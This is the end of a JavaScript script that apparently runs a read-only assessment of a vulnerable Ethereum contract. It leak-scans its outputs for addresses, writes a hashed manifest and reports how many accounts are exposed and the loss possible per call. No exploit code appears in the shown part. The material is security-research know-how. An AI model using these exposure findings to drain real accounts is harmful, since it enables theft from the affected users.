      if (/0x[0-9a-f]{40}(?![0-9a-f])/i.test(body)) { findings.push({ path: rel, category: "address" }); break; }
    }
  }
  const leak = canonical({ schemaVersion: 1, passed: findings.length === 0, findingCount: findings.length, findings, scope: generated, endpointUrlsDomainsHeadersKeysPersisted: false, rawRpcResponsesPersisted: false, accountOrTargetAddressesPersisted: false });
  write(LEAK, `${JSON.stringify(leak, null, 2)}\n`); if (!leak.passed) throw new Error("leak-scan-failed");
  const records = [RUNNER, TESTER, VALIDATOR, STEP1, VULNERABLE_SOURCE, MIGRATION_SOURCE, ROOTS, CONFIG, RAW, TESTS, LEAK, REPORT, INBOX, HANDOFF].map(hashFile), aggregateSha256 = aggregateHash(records);
  const manifest = canonical({ schemaVersion: 2, revision: raw.revision, runId: raw.runId, generatedAt, classification, aggregateSha256, records, fixedFinalizedPin: raw.endpointCoverage.fixedFinalizedPin, sourceContinuity: raw.sourceContinuity, deployment: raw.deployment, historicalCoverage: raw.historicalCoverage, matchingEventDerivedUniverseExposure: raw.matchingEventDerivedUniverseExposure, readOnlyBehavior: raw.readOnlyBehavior, gasMateriality: raw.gasMateriality, gates: raw.gates, pipelines: raw.pipelines, activityScope: raw.activityScope, tests: { artifact: hashFile(TESTS), deterministicCases: tests.deterministicCases, fuzzCases: tests.fuzzCases, passed: tests.passed }, leakScan: hashFile(LEAK), reopenTrigger: raw.reopenTrigger });
  write(MANIFEST, `${JSON.stringify(manifest, null, 2)}\n`);
  process.stdout.write(`${JSON.stringify({ ok: true, runId: raw.runId, classification, pin: { number: pin, hash: pinHash }, impactPrimitive: "2/5", financialExtraction: "0/5", gates: "0/0/false", behaviorConfirmed, universeScope: scopedExposure.scope, discoveredCandidateAccounts: scopedExposure.discoveredCandidateAccounts, enumeratedPositiveSupplyAccounts: scopedExposure.enumeratedPositiveSupplyAccounts, enumeratedNonFixedPositiveAccounts: scopedExposure.enumeratedNonFixedPositiveAccounts, enumeratedOneIndependentCallLossRaw: scopedExposure.enumeratedOneIndependentCallLossRaw, exactForDiscoveredUniverse: true, completeMarketTotal: false, gasScenario: raw.gasMateriality.scenario, tests: `${tests.deterministicCases}+${tests.fuzzCases}`, aggregateSha256, rpcRequests })}\n`);
}

(process.argv.includes("--offline-correct") ? offlineCorrect() : main()).catch((error) => {
  const message = String(error.message || error), allowed = /^(?:active-claim-invalid|local-deployment-artifact-invalid|two-ethereum-families-unavailable|two-family-pin-agreement-unavailable|two-family-call-disagreement|proxy-slot-disagreement|proxy-code-disagreement|implementation-code-disagreement|admin-code-disagreement|code-boundary-schema|code-boundary-unproven|delegate-code-disagreement|historical-log-coverage-unavailable|historical-log-schema|historical-log-family-disagreement|user-state-disagreement|accrual-probe-disagreement|zero-transfer-probe-disagreement|terminal-recheck-failed|leak-scan-failed)$/.test(message);
  const category = allowed ? message : `sanitized-${sha(Buffer.from(message)).slice(0, 12)}`;
  process.stderr.write(`${JSON.stringify({ ok: false, stage, category })}\n`); process.exit(1);
});
